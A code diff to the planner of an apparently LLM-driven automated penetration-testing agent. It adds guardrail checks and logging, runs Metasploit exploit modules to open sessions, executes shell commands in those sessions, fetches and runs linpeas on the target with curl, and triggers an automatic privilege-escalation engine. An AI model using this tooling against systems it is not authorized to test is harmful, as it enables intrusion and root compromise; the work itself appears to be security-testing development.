@@ -152,6 +152,8 @@ class Planner:
         msf=None,
         kb=None,
         verbose: bool = True,
+        logger=None,
+        guard=None,
     ):
         self._state   = state
         self._runner  = runner
@@ -159,7 +161,10 @@ class Planner:
         self._msf     = msf
         self._kb      = kb
         self._verbose = verbose
+        self._logger  = logger
+        self._guard   = guard
         self._phase_ctrl = PhaseController(state)
+        self._privesc_engine = None
 
         # Anti-loop tracking
         self._action_history: list[str] = []   # recent "tool:args_hash" strings
@@ -231,11 +236,27 @@ class Planner:
             # ── 5. Dispatch → execute ──────────────────────────────────────
             result_summary = self._dispatch(action)
 
+            # Day 5: structured action logging
+            if self._logger:
+                self._logger.action(
+                    tool=tool,
+                    args=args,
+                    result={
+                        "ok": not result_summary.startswith(("BLOCKED", "FAILED", "error", "Error")),
+                        "summary": result_summary,
+                    },
+                    elapsed_s=0.0,
+                )
+
             # ── 6. Update state ────────────────────────────────────────────
             self._state.log_action(tool, args, result_summary)
             self._sync_kb_to_state()
 
             self._print_result(result_summary)
+
+            # Day 5: run PrivescEngine once on first POST_EXPLOIT entry.
+            if self._state.phase == "POST_EXPLOIT" and self._privesc_engine is None:
+                self._run_privesc_engine()
 
             # ── 7. Root check ──────────────────────────────────────────────
             if self._state.is_root:
@@ -270,6 +291,16 @@ class Planner:
         Always returns a result_summary string — never raises.
         Handles all 14 tool names from VALID_TOOLS.
         """
+        # Day 5: guardrail check before every action.
+        if self._guard is not None:
+            allowed, block_reason = self._guard.check_action(action)
+            if not allowed:
+                self._state.log_error(action.get("tool", "unknown"), block_reason)
+                if self._logger:
+                    self._logger.error("guardrail", block_reason)
+                self._print_warn(f"GUARDRAIL: {block_reason[:120]}")
+                return f"BLOCKED by guardrail: {block_reason[:120]}"
+
         tool = action.get("tool", "")
         args = action.get("args", {})
         target = self._state.target or ""
@@ -468,6 +499,23 @@ class Planner:
             if not module_path:
                 return "msf_exploit skipped — missing required 'module' path"
 
+            # Support wrapper-style MSF client (kira/msf_client.py).
+            if hasattr(self._msf, "run_module"):
+                payload_name = args.get("payload")
+                result = self._msf.run_module(module_path, options, payload=payload_name)
+                if result.get("success"):
+                    sid = result.get("session_id")
+                    sessions = list((self._msf.list_sessions() or {}).keys())
+                    if sessions:
+                        self._state.update(
+                            sessions=[{"id": str(s), "type": "meterpreter"} for s in sessions]
+                        )
+                    return f"Exploit succeeded — session_id={sid}"
+                return (
+                    f"Exploit ran but no session opened. "
+                    f"Output: {result.get('output', '')} Error: {result.get('error', '')}"
+                )
+
             # LLM may provide "exploit/unix/..." while pymetasploit expects
             # type + path separately. Normalize to bare module path.
             if module_path.startswith("exploit/"):
@@ -539,18 +587,24 @@ class Planner:
             return "shell_cmd: Metasploit RPC not connected."
 
         try:
-            session = self._msf.sessions.session(str(session_id))
-            session_type = self._msf.sessions.list.get(
-                str(session_id), {}
-            ).get("type", "shell")
-
-            if session_type == "meterpreter":
-                result = session.run_with_output(cmd, timeout=30)
+            # Support wrapper-style MSF client (kira/msf_client.py).
+            if hasattr(self._msf, "shell_cmd"):
+                output = self._msf.shell_cmd(session_id=session_id, cmd=cmd, timeout=30).strip()
+                if not output:
+                    return f"shell_cmd '{cmd}': (no output)"
             else:
-                session.write(cmd + "\n")
-                time.sleep(2)
-                result = session.read()
-            output  = result.strip()
+                session = self._msf.sessions.session(str(session_id))
+                session_type = self._msf.sessions.list.get(
+                    str(session_id), {}
+                ).get("type", "shell")
+
+                if session_type == "meterpreter":
+                    result = session.run_with_output(cmd, timeout=30)
+                else:
+                    session.write(cmd + "\n")
+                    time.sleep(2)
+                    result = session.read()
+                output = result.strip()
 
             # Auto-detect root escalation
             if "uid=0" in output or "root" in output.lower():
@@ -581,15 +635,25 @@ class Planner:
             return "linpeas: Metasploit RPC not connected."
 
         try:
-            session = self._msf.sessions.session(str(session_id))
-
-            # Download linpeas if not already on target
-            dl_cmd = (
-                "curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest"
-                "/download/linpeas.sh -o /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh"
-            )
-            session.run_with_output(dl_cmd, timeout=30)
-            output = session.run_with_output("/tmp/linpeas.sh 2>/dev/null", timeout=120)
+            if hasattr(self._msf, "shell_cmd"):
+                dl_cmd = (
+                    "curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest"
+                    "/download/linpeas.sh -o /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh"
+                )
+                self._msf.shell_cmd(session_id=session_id, cmd=dl_cmd, timeout=30)
+                output = self._msf.shell_cmd(
+                    session_id=session_id,
+                    cmd="/tmp/linpeas.sh 2>/dev/null",
+                    timeout=120,
+                )
+            else:
+                session = self._msf.sessions.session(str(session_id))
+                dl_cmd = (
+                    "curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest"
+                    "/download/linpeas.sh -o /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh"
+                )
+                session.run_with_output(dl_cmd, timeout=30)
+                output = session.run_with_output("/tmp/linpeas.sh 2>/dev/null", timeout=120)
 
             # Surface a few key vectors as findings
             findings = _parse_linpeas_output(output)
@@ -606,6 +670,50 @@ class Planner:
         except Exception as e:
             self._state.log_error("linpeas", str(e))
             return f"linpeas error: {e}"
+
+    def _run_privesc_engine(self) -> None:
+        """
+        Auto-run PrivescEngine once when POST_EXPLOIT starts.
+        """
+        try:
+            from kira.privesc import PrivescEngine
+            self._privesc_engine = PrivescEngine()
+
+            shell_history = self._state.get("shell_history") or []
+            linpeas_output = ""
+            for entry in reversed(shell_history):
+                cmd = entry.get("cmd", "")
+                if "linpeas" in cmd or "linpeas.sh" in cmd:
+                    linpeas_output = entry.get("output", "")
+                    break
+
+            if not linpeas_output:
+                self._print_info("PrivescEngine: no linpeas output in history yet")
+                return
+
+            vectors = self._privesc_engine.analyse(linpeas_output, self._state)
+            self._print_info(f"PrivescEngine: {len(vectors)} escalation vector(s) detected")
+
+            if self._logger:
+                for v in vectors:
+                    self._logger.finding(v.to_finding_dict())
+
+            if vectors:
+                next_cmd = self._privesc_engine.suggest_next_cmd(
+                    vectors,
+                    [e.get("cmd", "") for e in shell_history],
+                )
+                if next_cmd:
+                    self._state.add_note(
+                        f"PrivescEngine suggests: {next_cmd} "
+                        f"(technique: {vectors[0].technique}, "
+                        f"confidence: {vectors[0].confidence:.0%})"
+                    )
+
+        except ImportError:
+            self._print_warn("privesc.py not found — skipping PrivescEngine")
+        except Exception as e:
+            self._print_warn(f"PrivescEngine error: {e}")
 
     def _do_add_finding(self, args: dict) -> str:
         """LLM manually registers a finding it observed."""
@@ -643,6 +751,8 @@ class Planner:
     def _do_advance_phase(self) -> str:
         old = self._state.phase
         new = self._state.advance_phase()
+        if self._logger and new != old:
+            self._logger.phase(old, new)
         return f"Phase advanced: {old} → {new}"
 
     # ── Phase gate ─────────────────────────────────────────────────────────────
